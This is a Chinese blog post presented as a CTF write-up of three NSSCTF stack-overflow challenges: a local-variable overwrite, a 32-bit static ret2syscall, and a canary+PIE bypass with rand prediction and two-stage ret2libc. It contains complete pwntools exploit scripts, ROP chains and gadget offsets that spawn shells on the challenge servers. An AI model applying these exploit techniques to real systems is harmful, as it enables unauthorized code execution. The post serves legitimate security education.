---
title: 栈溢出几道题
date: 2026-08-22
category: 安全
type: tech
description: 第七周考核三道栈溢出题：覆盖变量触发后门、静态链接的 ret2syscall，以及 canary+PIE 下的两段式 ret2libc
image: /week7-stack-overflow-cover.jpg
---

这周考核的是三道栈溢出题，难度是递进的。第一道只需要覆盖一个局部变量就能触发后门，第二道是 32 位静态链接的 ret2syscall，第三道就上了 canary 和 PIE，还得先预测随机数、再泄露地址、最后两段式 ret2libc。三道题正好把"栈溢出"这条线的几个关键点都串起来了，记录一下。

复现链接：

- 题目一（覆盖变量）：https://www.nssctf.cn/problem/7227
- 题目二（ret2syscall）：https://www.nssctf.cn/problem/6490
- 题目三（canary+PIE+ret2libc）：https://www.nssctf.cn/problem/7163

---

## 题目一：覆盖局部变量触发后门

### 前置知识：栈帧和 gets

函数调用的时候，栈上会开一块空间放局部变量，这就是**栈帧**。以 x86-64 为例，进入函数后 `rbp` 指向栈帧底部，局部变量和缓冲区按地址从高到低依次放在 `rbp` 下方（负偏移）。

`gets()` 这个函数最大的问题就是**不检查输入长度**，你给多少它就往缓冲区里写多少，写穿了缓冲区就会一路往上覆盖别的局部变量，甚至覆盖返回地址。

这道题没有 canary，没有 PIE，连栈都是可执行的（`checksec` 显示 `NX unknown - GNU_STACK missing`），属于非常友好的入门题。

### 逆向分析

用 IDA 或 Ghidra 看 `main`，逻辑很清晰：

```c
int main() {
    int flag = 0;               // 在 rbp-0x4
    char buf[0x300];            // 在 rbp-0x310 附近
    init();
    puts("这是一个不以...");     // 提示语
    gets(buf);                  // 危险函数
    if (flag != 0) {            // cmp [rbp-0x4], 0
        puts("喜欢扔的礼物吧");
        system("/bin/sh");      // 后门
    }
    return 0;
}
```

`buf` 的地址是 `rbp-0x310`，那个用来判断的变量 `flag` 在 `rbp-0x4`。两者在栈上是相邻的，中间隔着：

```
0x310 - 0x4 = 0x30c = 780 字节
```

也就是说，只要往 `buf` 里写超过 780 字节，就能覆盖到 `flag` 变量，把它从 0 改成非 0，从而绕过 `if` 判断，直接触发后面的 `system("/bin/sh")`。

### 利用思路

不用管返回地址，也不用 ROP，就一个目标：**把 `flag` 变量覆盖成非 0**。偏移是 780 字节，后面接上 4 个字节的非零值即可。

```python
from pwn import *

context.arch = 'amd64'
p = remote('node1.anna.nssctf.cn', 23779)   # 端口按实际环境填

offset = 0x30c
payload = b'A' * offset + p32(1)   # 780 字节填充 + 非零值覆盖 flag

p.sendline(payload)
p.interactive()   # 拿到 shell 后 cat flag
```

跑起来之后 `system("/bin/sh")` 被执行，直接弹出一个 shell，`cat` 一下就能读到 flag。

这道题虽然简单，但它把"栈溢出覆盖相邻变量"这个最基础的思路讲清楚了：**缓冲区越界写，最先被污染的就是紧挨着它的那些局部变量**，而不一定是返回地址。

---

## 题目二：32 位静态链接的 ret2syscall

### 前置知识：32 位系统调用和 ROP

第二道是 32 位、静态链接、开了 NX。`checksec` 的结果是 `NX enabled`，说明栈不可执行，shellcode 这条路堵死了。而且二进制里**没有 `system` 函数**（`nm` 里只有 `_IO_gets`、`_IO_puts`），所以也没法直接 ret2libc。

这种情况下的标准做法是 **ret2syscall**：自己用 ROP 链拼出一次系统调用。

32 位下系统调用的约定和 64 位不一样，它走的是 `int 0x80` 中断，参数用寄存器传：

| 寄存器 | 含义 |
|--------|------|
| `eax` | 系统调用号 |
| `ebx` | 第 1 个参数 |
| `ecx` | 第 2 个参数 |
| `edx` | 第 3 个参数 |

`execve` 的系统调用号是 `11`（`0xb`），签名是 `execve(path, argv, envp)`。我们想要执行 `/bin/sh`，就让：

- `eax = 0xb`
- `ebx = "/bin/sh"` 的地址
- `ecx = 0`（argv 为 NULL）
- `edx = 0`（envp 为 NULL）

然后 `int 0x80` 触发。

### 逆向分析

`main` 里有 `and esp, 0xfffffff0` 对齐、`sub esp, 0x80` 开栈，缓冲区在 `esp+0x1c`，然后 `gets` 读入。字符串里直接躺着一个 `/bin/sh`（地址 `0x80be408`），省得我们再往 bss 里写。

因为是静态链接，整个 libc 都被编译进来了，`ROPgadget` 一搜就是一大堆 gadget，找齐了四个关键片段：

| gadget | 地址 | 作用 |
|--------|------|------|
| `pop eax; ret` | 0x080bb196 | 设置系统调用号 |
| `pop ecx; pop ebx; ret` | 0x0806eb91 | 设置 ecx 和 ebx |
| `pop edx; ret` | 0x0806eb6a | 设置 edx |
| `int 0x80` | 0x08049421 | 触发系统调用 |

### 确定偏移

偏移这里有个小坑。`main` 开头做了 `and esp, 0xfffffff0` 对齐，再 `sub esp, 0x80`，缓冲区在 `esp+0x1c`。缓冲区到返回地址的距离跟栈的对齐状态有关，不是个死数。

按 32 位 ABI，函数入口处 `esp % 16 == 12`，顺着算下来偏移应该是 `0x70`（112 字节）。我直接用 `0x70` 试了一下，一次就通了，说明这个推导是对的。

### 利用思路

ROP 链按 `eax → ecx/ebx → edx → int 0x80` 的顺序摆好：

```python
from pwn import *

context.arch = 'i386'
p = remote('node1.anna.nssctf.cn', 22657)   # 端口按实际环境填

pop_eax     = 0x080bb196
pop_ecx_ebx = 0x0806eb91
pop_edx     = 0x0806eb6a
int80       = 0x08049421
binsh       = 0x080be408

offset = 0x70
payload  = b'A' * offset
payload += p32(pop_eax) + p32(0xb)              # eax = 11 (execve)
payload += p32(pop_ecx_ebx) + p32(0) + p32(binsh)  # ecx=0, ebx=/bin/sh
payload += p32(pop_edx) + p32(0)                # edx = 0
payload += p32(int80)                           # int 0x80

p.sendline(payload)
p.interactive()
```

链子的执行过程就是：先 `pop eax` 把 `0xb` 弹给 eax，`ret` 跳到下一个 gadget；`pop ecx; pop ebx` 依次把 `0` 和 `/bin/sh` 地址弹进去；再 `pop edx` 把 edx 清零；最后 `int 0x80` 触发 `execve("/bin/sh", NULL, NULL)`，拿到 shell。

> 注意：`gets` 读到换行就停，所以 payload 里不能出现 `\x0a`。上面这些地址的字节里都没有 `0a`，可以直接用。要是某个 gadget 地址碰巧带 `0a`，就得换个等价 gadget。

这道题的核心是理解 32 位的系统调用约定，以及"静态链接没 system 就自己拼 syscall"这个思路。

---

## 题目三：canary+PIE 下的两段式 ret2libc

### 前置知识：canary、PIE 和 RELRO

第三道是三道里最麻烦的。`checksec` 全绿：**canary 开、PIE 开、Full RELRO、NX**，属于防护拉满的类型。

- **canary（栈金丝雀）**：函数入口从 `fs:0x28` 读一个随机值放到栈上（`rbp-0x8`），返回前再比对一次，被覆盖就调用 `__stack_chk_fail` 直接退出。所以溢出时**必须先把 canary 原样填回去**。
- **PIE**：程序加载基址随机，所有代码地址都是 `基址 + 偏移`。ROP 之前得先泄露出基址。
- **Full RELRO**：GOT 表只读，不能改，所以只能靠泄露地址再跳 libc。

好消息是，程序里提供了三个现成的 gadget 函数：`pop_rdi_ret`、`pop_rsi_ret`、`pop_rdx_ret`，还有一个 `gift` 函数专门用来泄露。

### 逆向分析：main 的随机数校验

`main` 一开始会先出一道"猜随机数"的题：

```c
int main() {
    int size;
    setvbuf(...);
    puts("Can you guess my random number?");
    puts("Input size: ");
    scanf("%d", &size);
    if (size > 5) { puts("Size too large"); exit(0); }

    puts("Input random number: ");
    read(0, buf, min(size, 0xff));
    // 把 buf 末尾补 0，strtol 转成数字
    long guess = strtol(buf, NULL, 10);

    srand(0x1fff000);          // 固定种子！
    long target = rand();
    if (guess == target) {
        gift();                // 泄露
        vuln();                // 溢出点
    } else {
        puts("Wrong random number, you are failed!");
        exit(0);
    }
}
```

两个关键点：

1. **种子是固定的** `0x1fff000`，所以 `rand()` 的结果是可预测的。
2. 那个 `size` 只检查了"大于 5 就退出"，**没检查负数**。而后面 `read` 的长度是 `min(size, 0xff)`，用的是**无符号**比较。如果我传 `size = -1`（无符号就是 `0xffffffff`），`min(-1, 0xff)` 就等于 `0xff = 255`，一下就能读进 255 字节，足够塞下 10 位数字的 `rand()` 结果。

### 预测随机数

`rand()` 用的是 glibc 的实现，也就是 `random()` 的 TYPE_3 变体。种子 `srand(0x1fff000)` 固定，所以结果也固定。我把 glibc 的算法用 Python 复现了一遍（先拿 `srand(1)` 的经典结果 `1804289383` 验证过是对的）：

```python
M = 2147483647

def glibc_rand(seed):
    if seed == 0:
        seed = 1
    state = [0] * 31
    word = seed
    state[0] = word
    for i in range(1, 31):
        hi = word // 127773
        lo = word % 127773
        word = 16807 * lo - 2836 * hi
        if word < 0:
            word += M
        state[i] = word

    fptr, rptr = 3, 0
    def step():
        nonlocal fptr, rptr
        val = (state[fptr] + state[rptr]) & 0xffffffff
        state[fptr] = val & 0xffffffff
        res = val >> 1
        fptr += 1
        if fptr >= 31:
            fptr = 0; rptr += 1
        else:
            rptr += 1
            if rptr >= 31: rptr = 0
        return res

    for _ in range(310):   # srandom 会先丢弃 310 个值热身
        step()
    return step()

print(glibc_rand(0x1fff000))   # 1536235749
```

算出来 `rand() = 1536235749`。这就是要猜的数。

### 泄露 canary 和 PIE 基址

过了随机数校验后，会调用 `gift()`：

```c
void gift() {
    char buf[0x100];
    long canary = *(long *)(rbp - 0x8);   // 读 canary
    long pie    = 0;                       // 实际上 lea 算出来是 PIE 基址
    puts("Oh! You are so smart! Here are some gift for you!");
    snprintf(buf, 0x100, "0x%016lx\n0x%016lx\n", canary, pie);
    write(1, buf, len);
}
```

它会打印两个十六进制数：第一个是 **canary**，第二个是 **PIE 基址**。这里有个小坑：`puts` 打印的那句提示语字符串本身末尾带了一个 `\n`，`puts` 又会再补一个 `\n`，所以输出里提示语后面会连着两个换行，解析的时候得注意跳过空行。

```python
import re
p.recvuntil(b'gift for you!')
data = p.recvuntil(b'happily!\n')
canary, pie = map(lambda x: int(x, 16), re.findall(rb'0x[0-9a-fA-F]+', data))
```

### 漏洞点 vuln

```c
void vuln() {
    char buf[0x70];                    // rbp-0x70
    long canary = *(long *)(rbp - 0x8);
    write(1, "Now You can smashing happily!\n", 0x1e);
    read(0, buf, 0x120);               // 读 0x120 字节到 0x70 的缓冲区
    // canary 检查
}
```

缓冲区 `0x70` 字节，却读 `0x120` 字节，明显溢出。canary 在 `rbp-0x8`，从缓冲区算偏移是 `0x70 - 0x8 = 0x68`（104 字节）。所以 payload 布局是：

```
104 字节填充 + canary(8字节) + 8字节(覆盖旧rbp) + ROP链
```

### 两段式 ROP：先泄露 libc，再 getshell

因为开了 PIE，所有 gadget 地址都得 `pie + 偏移`。而 libc 的基址不知道，所以要先泄露。整个过程分两段：

**第一段**：用 `pop rdi; ret` 把 `puts@got` 传给 `puts@plt`，打印出 `puts` 在 libc 里的真实地址，然后 `ret` 回 `main` 重新走一遍流程。

**第二段**：根据泄露的 `puts` 地址算出 libc 基址，再算 `system` 和 `/bin/sh` 的地址，直接 `system("/bin/sh")`。

几个关键偏移（都是 PIE 相对偏移）：

| 符号 | 偏移 |
|------|------|
| `puts@plt` | 0x10f0 |
| `puts@got` | 0x3f80 |
| `main` | 0x1451 |
| `pop rdi; ret` | 0x13fe |

libc（题目给的 `libc.so.6`）：

| 符号 | 偏移 |
|------|------|
| `puts` | 0x80e50 |
| `system` | 0x50d70 |
| `/bin/sh` | 0x1d8678 |

这里还有个细节：那三个 `pop_xxx_ret` 函数虽然符号名就叫这个，但它们其实是带 prologue 的完整函数（开头有 `endbr64; push rbp; sub rsp,0x10` 这些）。如果直接跳函数开头，prologue 会把栈搞乱，`pop rdi` 弹出来的就不是我们想要的值了。所以要用**函数内部的真正 `pop rdi; ret` 指令**，也就是 `0x13fe`（跳过 prologue）。

另外 x86-64 下调用 `system` 要求栈 16 字节对齐，所以第二段在 `pop rdi; ret` 前面补了一个 `ret`（`0x13ff`）来对齐，否则 `system` 内部 `movaps` 会崩。

完整 exp：

```python
from pwn import *
import re

context.arch = 'amd64'
libc = ELF('./libc.so.6')
puts_off   = libc.symbols['puts']
system_off = libc.symbols['system']
binsh_off  = next(libc.search(b'/bin/sh\x00'))

RAND = 1536235749
puts_plt, puts_got, main = 0x10f0, 0x3f80, 0x1451
pop_rdi_ret, ret = 0x13fe, 0x13ff

def guess(p):
    p.sendlineafter(b'Input size: ', b'-1')
    p.sendlineafter(b'Input random number: ', str(RAND).encode())

def get_gift(p):
    p.recvuntil(b'gift for you!')
    data = p.recvuntil(b'happily!\n')
    vals = re.findall(rb'0x[0-9a-fA-F]+', data)
    return int(vals[0], 16), int(vals[1], 16)

p = remote('node1.anna.nssctf.cn', 25092)   # 端口按实际环境填

# 第一段：泄露 puts 地址
guess(p)
canary, pie = get_gift(p)

payload1  = b'A' * 0x68 + p64(canary) + b'B' * 8
payload1 += p64(pie + pop_rdi_ret) + p64(pie + puts_got)
payload1 += p64(pie + puts_plt) + p64(pie + main)
p.send(payload1)

data = p.recvuntil(b'Can you guess my random number?')
puts_addr = u64(data[:6].ljust(8, b'\x00'))
libc_base = puts_addr - puts_off

# 第二段：ret2libc
guess(p)
canary2, pie2 = get_gift(p)

system = libc_base + system_off
binsh  = libc_base + binsh_off

payload2  = b'A' * 0x68 + p64(canary2) + b'B' * 8
payload2 += p64(pie2 + ret) + p64(pie2 + pop_rdi_ret) + p64(binsh) + p64(system)
p.send(payload2)

p.interactive()
```

跑完拿到 shell，读 flag 即可。

> 补充一个小细节：泄露 `puts` 地址时，`puts` 打印的是字符串，遇到 `\x00` 就停。64 位用户态地址高两字节本来就是 `0`，所以 `puts` 只会输出 6 个有效字节，后面自己补 `\x00` 就能还原出完整地址。这也是为什么代码里用 `data[:6]`。

---

## 总结

三道题从易到难，把栈溢出这条线的关键点都过了一遍：

1. **覆盖局部变量**：溢出最先污染的是相邻变量，不一定非要去打返回地址。
2. **ret2syscall**：静态链接、没有 system、又开了 NX 时，可以自己用 ROP 拼系统调用，32 位下是 `int 0x80`。
3. **canary + PIE 的组合拳**：先想办法泄露 canary 和基址，再两段式先泄露 libc 再 getshell，还要注意 gadget 的 prologue 和栈对齐这种细节。

每个防护机制都有自己的绕过套路，关键是搞清楚**防护在防什么、信息从哪泄露**。这三道题分别是三个台阶，踩稳了，后面的堆利用才好往下走。
